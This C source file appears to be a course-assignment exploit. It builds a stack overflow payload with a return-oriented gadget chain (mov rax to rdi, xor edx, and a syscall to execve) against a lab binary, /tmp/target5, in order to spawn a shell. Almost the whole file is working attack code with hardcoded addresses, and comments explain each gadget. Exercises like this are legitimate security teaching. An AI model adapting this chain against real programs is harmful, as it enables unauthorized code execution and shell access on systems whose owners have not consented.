#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target5"
#define DEFAULT_OUTPUT "/tmp/xploit5_output"

int main(int argc, char *argv[])
{
  // determine exploit length
  char exploit[348];

  // fill exploit buffer
  memset(exploit, 'U', sizeof(exploit));

  // gadget to populate rax with "bin/shell/"
  *(size_t *)(exploit+256) = 0x7fffffffdcd0;  // point to beginning of buf
  *(size_t *)(exploit+256+8) = 0x401855;  // address of get_shell

  // gadget to move contents of rax to rdi
  //*(size_t *)(exploit) = 0x7fffffffdcd0 + 16;  // point to next gadget
  *(size_t *)(exploit+256+16) = 0x4021ab;  // mov %rax, %rdi

  // gadget to zero out rax (edx)
  //*(size_t *)(exploit+16) = 0x7fffffffdcd0 + 32;  // point to next gadget
  *(size_t *)(exploit+256+24) = 0x40452f; // xor %edx, %edx

  // gadget to zero out set rsi
  // not needed since rsi already contains address that points to zero 
  //*(size_t *)(exploit+32) = exploit + 48;  // point to next gadget
  //*(size_t *)(exploit+40) = 0x401a36;  // xor %eax, %eax

  // gadget to execute syscall
  //*(size_t *)(exploit+32) = 48; // point elsewhere
  *(size_t *)(exploit+256+32) = 0x4b2f24;  // syscall execve 59=0x3B

  // write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");

  return 0;
}
